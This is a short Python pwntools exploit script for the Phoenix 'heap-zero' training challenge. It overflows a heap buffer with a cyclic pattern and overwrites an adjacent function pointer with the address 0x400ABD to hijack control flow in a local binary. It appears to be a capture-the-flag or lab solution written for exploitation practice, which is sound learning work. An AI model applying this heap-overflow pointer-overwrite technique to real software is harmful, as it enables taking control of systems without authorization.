#!/usr/bin/env python3
from pwn import *

path = "/opt/phoenix/amd64/heap-zero"
context.binary = path
# context.log_level = "debug"

# overwrite data buffer + prev chunk size + cur chunk size
payload = cyclic(64 + 8 + 8)
payload += pack(0x400ABD)
# can't have nulls in argv; the upper bytes of nowinner are nulls anyway
payload = payload.rstrip(b"\x00")
io = process([path, payload])
print(io.recvline())  # Welcome
print(io.recvline())  # result
print(io.recvline())  # result
